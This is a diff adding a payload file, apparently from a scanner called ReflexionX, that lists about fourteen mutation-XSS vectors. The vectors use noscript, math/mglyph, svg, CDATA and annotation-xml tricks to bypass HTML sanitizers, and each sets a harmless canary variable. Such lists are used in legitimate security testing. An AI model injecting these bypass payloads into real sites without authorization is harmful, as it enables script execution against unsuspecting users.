@@ -1,0 +1,18 @@
+# ReflexionX v1.0.0 — mXSS (Mutation XSS) Payloads
+# Exploit browser parsing differentials and sanitizer bypasses
+# Each payload sets window._xss_confirmed = 'CANARY'
+
+<noscript><p title="</noscript><img src=x onerror=window._xss_confirmed='CANARY'>">
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=window._xss_confirmed='CANARY'></table></mtext></math>
+<svg><foreignObject><body onload=window._xss_confirmed='CANARY'></foreignObject></svg>
+<style><img src=x onerror=window._xss_confirmed='CANARY'//</style>
+<svg><desc><![CDATA[</desc><img src=x onerror=window._xss_confirmed='CANARY'>]]></svg>
+<title><img src=x onerror=window._xss_confirmed='CANARY'></title>
+<xmp><img src=x onerror=window._xss_confirmed='CANARY'></xmp>
+<iframe srcdoc="<img src=x onerror=window._xss_confirmed='CANARY'>"></iframe>
+<math><mi><table><mglyph><style><!--</style><img src=x onerror=window._xss_confirmed='CANARY'></table></mi></math>
+<svg><style><!--</style><img src=x onerror=window._xss_confirmed='CANARY'>--></svg>
+<listing><img src=x onerror=window._xss_confirmed='CANARY'></listing>
+<svg><animate onbegin=window._xss_confirmed='CANARY' attributeName=x dur=1s>
+<svg><set onbegin=window._xss_confirmed='CANARY' attributeName=x to=1>
+<math><mrow><annotation-xml encoding="text/html"><img src=x onerror=window._xss_confirmed='CANARY'></annotation-xml></mrow></math>
